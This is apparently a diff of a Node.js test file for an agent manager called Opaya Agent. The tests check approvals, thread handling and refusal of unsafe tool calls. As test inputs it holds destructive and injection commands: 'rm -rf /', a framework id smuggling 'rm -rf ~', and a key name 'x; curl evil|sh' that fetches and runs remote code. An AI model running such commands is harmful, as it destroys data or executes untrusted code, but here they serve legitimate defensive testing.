@@ -15,14 +15,19 @@ async function fixture(t,script,{allow=true,trusted=false}={}){
   await agent.init();await agent.saveConfig({preset:'ollama',model:'m1'});
   return {root,agent,broker,approvals,commands,requests:m.requests};
 }
-const settle=async agent=>{for(let i=0;i<2000&&agent.busy;i++)await new Promise(r=>setTimeout(r,5));assert.equal(agent.busy,false);};
+// Waits until the chat and every thread are done.
+const settle=async agent=>{for(let i=0;i<4000&&(agent.busy||agent.runs.size||agent.threads.some(t=>t.status==='queued'));i++)await new Promise(r=>setTimeout(r,5));assert.equal(agent.busy,false);assert.equal(agent.runs.size,0);};
+// Work that changes something runs in a thread.
+const work=(agent,task)=>agent.startThread({title:'Test task',task});
 test('Opaya Agent answers through tools and shows one reply per request',async t=>{
   const {agent,broker,requests}=await fixture(t,[call('get_workspace'),{content:'You have one agent.'}]);
   await broker.saveAgent({agent:apiAgent('one',8642)});
   agent.begin('What do I have?');await settle(agent);
   const shown=agent.describe().messages;assert.deepEqual(shown.map(m=>m.role),['user','assistant']);assert.equal(shown[1].content,'You have one agent.');assert.deepEqual(shown[1].activity,['Using get workspace']);
   const toolResult=requests[1].body.messages.find(m=>m.role==='tool');assert.match(toolResult.content,/"name":"one"/);
-  assert.equal(requests[0].body.tools.some(t=>t.function.name==='save_connection'),true);
+  // The chat only reads and starts threads; changes happen in threads.
+  const chatTools=requests[0].body.tools.map(t=>t.function.name);
+  assert(chatTools.includes('start_thread'));assert(!chatTools.includes('save_connection'));assert(!chatTools.includes('install_framework'));
 });
 test('Opaya Agent uses the local Codex app-server and exposes live tool activity',async t=>{
   const root=await temp(t),broker=new Broker({store:new Store(root),vault:new Vault(root,secure()),emit:()=>{},approve:async()=>true,adapterFactory:()=>({connect:async()=>({}),close(){}})});await broker.init();
@@ -40,25 +45,25 @@ test('Opaya Agent uses the local Codex app-server and exposes live tool activity
 });
 test('Opaya Agent changes connections only after approval and never stores tokens it is given',async t=>{
   const {agent,broker,approvals}=await fixture(t,[call('save_connection',{connection:{...apiAgent('added',8650),token:'secret-token'}}),{content:'Added.'}]);
-  agent.begin('Add my gateway');await settle(agent);
+  work(agent,'Add my gateway');await settle(agent);
   assert.equal(approvals.length,1);assert.match(approvals[0].title,/Add connection "added"/);assert(!approvals[0].detail.includes('secret-token'));
   assert.equal(broker.data.agents[0].name,'added');assert.equal(broker.vault.has(broker.data.agents[0].id),false);
 });
 test('declined approvals stop changes and installs; unknown tools and bad input are refused',async t=>{
   const {agent,broker,commands,requests}=await fixture(t,[call('save_machine',{machine:{alias:'vps'}}),call('install_framework',{framework_id:'codex'}),call('run_shell',{command:'rm -rf /'}),call('install_framework',{framework_id:'codex; rm -rf ~'}),{content:'ok'}],{allow:false});
-  agent.begin('set things up');await settle(agent);
+  work(agent,'set things up');await settle(agent);
   assert.equal(broker.data.hosts.length,0);assert.equal(commands.length,0);
   const results=requests.at(-1).body.messages.filter(m=>m.role==='tool').map(m=>JSON.parse(m.content).error);
   assert.match(results[0],/declined/);assert.match(results[1],/declined/);assert.match(results[2],/Unknown tool/);assert.match(results[3],/Unknown agent framework/);
 });
 test('approved installs run the fixed catalog command in a visible terminal',async t=>{
   const {agent,commands,approvals}=await fixture(t,[call('install_framework',{framework_id:'codex'}),{content:'Installing.'}]);
-  agent.begin('install codex');await settle(agent);
+  work(agent,'install codex');await settle(agent);
   assert.equal(commands.length,1);assert(commands[0].command.startsWith(catalog.command('codex',{remote:false}).command+'; '));assert.match(commands[0].command,/\[opaya\] finished with exit code/);assert.equal(commands[0].host,null);assert.match(approvals[0].detail,/npm(\.cmd)? install -g @openai\/codex/);
 });
 test('notes stay inside the agent home folder and model endpoints follow the same rules as agents',async t=>{
   const {agent,root}=await fixture(t,[call('write_notes',{content:'Hermes runs on vps.'}),{content:'Saved.'}]);
-  agent.begin('remember');await settle(agent);
+  work(agent,'remember');await settle(agent);
   assert.equal(await fs.readFile(path.join(root,'opaya-agent','notes.md'),'utf8'),'Hermes runs on vps.');
   await assert.rejects(()=>agent.saveConfig({preset:'custom',baseUrl:'http://example.com/v1',model:'x'}),/HTTPS|plain|loopback|public/i);
   await assert.rejects(()=>agent.saveConfig({preset:'nope',model:'x'}),/Unknown model provider/);
@@ -66,31 +71,31 @@ test('notes stay inside the agent home folder and model endpoints follow the sam
 });
 test('ssh key actions reject names that could inject shell syntax',async t=>{
   const {agent,commands,requests}=await fixture(t,[call('ssh_key',{action:'generate',key_name:'x; curl evil|sh'}),{content:'no'}]);
-  agent.begin('make a key');await settle(agent);
+  work(agent,'make a key');await settle(agent);
   assert.equal(commands.length,0);assert.match(JSON.parse(requests.at(-1).body.messages.find(m=>m.role==='tool').content).error,/key name/);
 });
 test('the Opaya Agent can read project files but never secret files',async t=>{
   const dir=await temp(t);await fs.writeFile(path.join(dir,'README.md'),'hello project');await fs.writeFile(path.join(dir,'.env'),'API_KEY=sk-live-secret');
   const {agent,requests}=await fixture(t,[call('read_file',{path:path.join(dir,'README.md')}),call('read_file',{path:path.join(dir,'.env')}),call('list_directory',{path:dir}),{content:'ok'}]);
-  agent.begin('look at my project');await settle(agent);
+  work(agent,'look at my project');await settle(agent);
   const results=requests.at(-1).body.messages.filter(m=>m.role==='tool').map(m=>JSON.parse(m.content));
   assert.equal(results[0].text,'hello project');assert.match(results[1].error,/secrets/);assert(!JSON.stringify(requests).includes('sk-live-secret'));
   assert.deepEqual(results[2].entries.map(e=>e.name).sort(),['.env','README.md']);
 });
 test('dependencies and the essentials bundle are installable through the same approved catalog path',async t=>{
   const {agent,commands,approvals}=await fixture(t,[call('install_framework',{framework_id:'essentials'}),call('install_framework',{framework_id:'node'}),{content:'done'}]);
-  agent.begin('install everything I need');await settle(agent);
+  work(agent,'install everything I need');await settle(agent);
   assert.equal(commands.length,2);assert(commands[0].command.startsWith(catalog.command('essentials',{remote:false}).command+'; '));assert.match(commands[0].command,/\[opaya\] finished with exit code/);assert.match(commands[1].command,/node/);assert.equal(approvals.length,2);
   const kinds=new Set(catalog.list().map(f=>f.kind));assert.deepEqual([...kinds].sort(),['agent','bundle','dependency']);
 });
 test('iTrust lets the Opaya Agent act without asking, but removals still ask',async t=>{
   const {agent,broker,commands,approvals}=await fixture(t,[call('install_framework',{framework_id:'codex'}),call('get_workspace'),{content:'ok'}],{allow:false,trusted:true});
   await broker.saveAgent({agent:apiAgent('keep',8660)});
-  agent.begin('install codex');await settle(agent);
-  assert.equal(commands.length,1);assert.equal(approvals.length,0);assert(agent.describe().messages.at(-1).activity.some(x=>/iTrust approved: Install Codex CLI/.test(x)));
+  work(agent,'install codex');await settle(agent);
+  assert.equal(commands.length,1);assert.equal(approvals.length,0);assert(agent.threads.at(-1).activity.some(x=>/iTrust approved: Install Codex CLI/.test(x.text)));
   const {agent:a2,broker:b2,approvals:ap2}=await fixture(t,[call('remove_connection',{agent_id:'keep-me'}),{content:'ok'}],{allow:false,trusted:true});
   await b2.saveAgent({agent:{...apiAgent('keep',8661),id:'keep-me'}});
-  a2.begin('remove it');await settle(a2);
+  work(a2,'remove it');await settle(a2);
   assert.equal(ap2.length,1);assert.match(ap2[0].title,/Remove connection/);assert.equal(b2.data.agents.length,1,'declined removal keeps the agent');
 });
 test('installer output is read as finished, asking a question or asking for a password',()=>{
@@ -121,4 +126,84 @@ test('every framework and dependency has an update command, and the essentials u
   assert.match(catalog.command('hermes',{remote:true,update:true}).command,/^hermes update$/);
   const all=catalog.command('essentials',{remote:true,update:true}).command;for(const bin of ['node','python3','git','uv self update','tmux'])assert(all.includes(bin),bin);
   assert.match(catalog.command('node',{remote:true}).command,/sudo DEBIAN_FRONTEND=noninteractive apt-get install -y nodejs/);
+});
+test('the chat starts a thread: the short reply comes first, then the thread card, and the work runs in the thread',async t=>{
+  const {agent,commands,requests}=await fixture(t,[
+    call('start_thread',{title:'Install Codex',task:'Install the Codex CLI on this computer and add it to Opaya.',steps:['Install','Add to Opaya']}),
+    {content:'On it: I started a thread.'},
+    call('set_steps',{steps:[{text:'Install Codex CLI',state:'active'},{text:'Add it to Opaya',state:'pending'}]}),
+    call('install_framework',{framework_id:'codex'}),
+    call('set_steps',{steps:[{text:'Install Codex CLI',state:'done'},{text:'Add it to Opaya',state:'done'}]}),
+    {content:'Codex CLI is installed.\n\nSign in with `codex` once.'}]);
+  agent.begin('Install codex please');await settle(agent);
+  const d=agent.describe();
+  assert.deepEqual(d.messages.map(m=>m.role),['user','assistant','thread']);assert.equal(d.messages[1].content,'On it: I started a thread.');
+  const th=d.threads.find(x=>x.id===d.messages[2].threadId);
+  assert.equal(th.title,'Install Codex');assert.equal(th.status,'done');assert.equal(th.summary,'Codex CLI is installed.');
+  assert.deepEqual(th.steps.map(s=>s.state),['done','done']);
+  assert.deepEqual(th.messages.map(m=>m.role),['task','assistant']);assert.match(th.messages[0].content,/Install the Codex CLI/);
+  assert(th.activity.some(a=>a.text==='Using install framework'));assert(!th.activity.some(a=>/set steps/.test(a.text)),'the checklist is not logged as activity');
+  assert.equal(commands.length,1);
+  // The thread sees the task as its request and gets the tools that change things.
+  const first=requests[2].body;assert.equal(first.messages.at(-1).content,'Install the Codex CLI on this computer and add it to Opaya.');
+  assert(first.tools.some(x=>x.function.name==='install_framework'));assert(first.tools.some(x=>x.function.name==='set_steps'));assert(!first.tools.some(x=>x.function.name==='start_thread'));
+  // The next chat request knows about the thread.
+  assert.match(agent.system({kind:'chat'}),/Install Codex \[done\]: Codex CLI is installed\./);
+});
+test('the chat cannot change things itself, and threads cannot start threads',async t=>{
+  const {agent,broker,requests}=await fixture(t,[call('save_connection',{connection:apiAgent('x',8670)}),{content:'ok'}]);
+  agent.begin('add it');await settle(agent);
+  assert.equal(broker.data.agents.length,0);
+  assert.match(JSON.parse(requests[1].body.messages.find(m=>m.role==='tool').content).error,/start a thread/);
+  const run={kind:'thread',thread:{id:'x',activity:[],inbox:[]},reply:{activity:[]},controller:new AbortController()};
+  await assert.rejects(()=>agent.tool('start_thread',{title:'x',task:'y'},run),/Unknown tool/);
+});
+test('a message written in a working thread is taken in at its next step; Stop ends only that thread',async t=>{
+  let release;const gate=new Promise(r=>{release=r;});
+  const root=await temp(t),requests=[];
+  const broker=new Broker({store:new Store(root),vault:new Vault(root,secure()),emit:()=>{},approve:async()=>true,adapterFactory:()=>({connect:async()=>({}),close(){},run:async()=>({})})});await broker.init();t.after(()=>broker.close());
+  const script=[call('get_workspace'),{content:'Done, with Hermes too.'}];
+  const fetchImpl=async(url,init)=>{const body=JSON.parse(init.body);requests.push(body);if(requests.length===1)await gate;return {ok:true,status:200,json:async()=>({choices:[{message:script.shift()||{content:'x'}}]})};};
+  const agent=new OpayaAgent({root,vault:broker.vault,broker,terminals:{describe:()=>[]},approve:async()=>true,emit:()=>{},runInTerminal:async()=>({id:'t'}),fetchImpl});
+  await agent.init();await agent.saveConfig({preset:'ollama',model:'m1'});
+  const th=agent.startThread({title:'Check',task:'Check my agents.'});
+  for(let i=0;i<200&&!requests.length;i++)await new Promise(r=>setTimeout(r,5));
+  assert.equal(agent.describe().threads[0].status,'working');
+  agent.threadSend(th.id,'Also check Hermes.');release();await settle(agent);
+  assert.deepEqual(requests[1].messages.filter(m=>m.role==='user').map(m=>m.content),['Check my agents.','Also check Hermes.']);
+  assert.deepEqual(th.messages.map(m=>m.role),['task','user','assistant']);assert.equal(th.status,'done');
+  // Writing in a finished thread starts a new turn with its history.
+  script.push({content:'Nothing else to do.'});agent.threadSend(th.id,'Anything else?');await settle(agent);
+  assert.equal(requests.at(-1).messages.filter(m=>m.role==='user').at(-1).content,'Anything else?');assert(requests.at(-1).messages.some(m=>m.role==='tool'),'the earlier tool results are kept');
+  // Stop: a queued thread stops at once.
+  const q=agent.startThread({title:'Later',task:'Later.',hold:'nobody'});agent.stopThread(q.id);assert.equal(q.status,'stopped');
+});
+test('Opaya starts one thread per problem, not again while it works or right after, and none without a model',async t=>{
+  const {agent}=await fixture(t,[]);
+  const first=agent.autoThread({key:'a1|gateway',title:'Fix Hermes',task:'Hermes does not connect.',notice:{title:'Hermes does not connect',text:'ECONNREFUSED'}});
+  assert.equal(first.origin,'auto');assert.equal(agent.autoThread({key:'a1|gateway',title:'Fix Hermes',task:'again'}),first,'the same problem goes to the thread that works on it');
+  await settle(agent);assert.equal(agent.autoThread({key:'a1|gateway',title:'Fix Hermes',task:'again'}),null,'a problem handled minutes ago is left alone');
+  const shown=agent.describe().messages;assert.deepEqual(shown.map(m=>m.role),['notice','thread']);assert.equal(shown[0].title,'Hermes does not connect');
+  assert.match(agent.system({kind:'thread',thread:first}),/Opaya started this thread by itself/);
+  const bare=new OpayaAgent({root:await temp(t),vault:agent.vault,broker:agent.broker,terminals:{describe:()=>[]},approve:async()=>true,emit:()=>{}});await bare.init();
+  assert.equal(bare.autoThread({key:'k',title:'x',task:'y'}),null);
+});
+test('threads are saved, and one that was working when Opaya closed is marked, not run again',async t=>{
+  const {agent,root,broker}=await fixture(t,[{content:'done'}]);
+  const th=agent.startThread({title:'Saved',task:'Remember me.'});await settle(agent);
+  const fs2=require('node:fs/promises');const file=path.join(root,'opaya-agent','threads.json');
+  const saved=JSON.parse(await fs2.readFile(file,'utf8'));assert.equal(saved[0].title,'Saved');assert.equal(saved[0].status,'done');assert(!('inbox' in saved[0]));
+  saved.push({...saved[0],id:'was-working',status:'working'});await fs2.writeFile(file,JSON.stringify(saved));
+  const again=new OpayaAgent({root,vault:broker.vault,broker,terminals:{describe:()=>[]},approve:async()=>true,emit:()=>{}});await again.init();
+  const w=again.threads.find(x=>x.id==='was-working');assert.equal(w.status,'stopped');assert.match(w.error,/closed while this thread was working/);
+  await assert.rejects(()=>again.removeThread('nope'),/not found/);await again.removeThread(th.id);assert(!again.threads.some(x=>x.id===th.id));
+});
+test('the gateway tool starts a Hermes gateway after approval and refuses agents without one',async t=>{
+  const {agent,broker,approvals}=await fixture(t,[]);
+  const h=await broker.saveAgent({agent:{...apiAgent('hermes',8680),command:'hermes'}});const api=await broker.saveAgent({agent:{name:'ds',provider:'deepseek',protocol:'openai',transport:'http',endpoint:'https://api.deepseek.com/v1',model:'deepseek-chat'}});
+  let ran=null;broker.gatewayRun=async(id,op)=>{ran=[id,op];return {output:'\x1b[32mstarted\x1b[0m',operation:op,connected:true};};
+  const run={kind:'thread',thread:{id:'x',title:'Fix',activity:[],inbox:[]},reply:{activity:[]},controller:new AbortController()};
+  const r=await agent.tool('agent_gateway',{agent_id:h.id,action:'start'},run);
+  assert.deepEqual(ran,[h.id,'start']);assert.equal(r.output,'started');assert.match(approvals.at(-1).title,/Start the gateway of hermes/);
+  await assert.rejects(()=>agent.tool('agent_gateway',{agent_id:api.id,action:'start'},run),/no gateway/);
 });
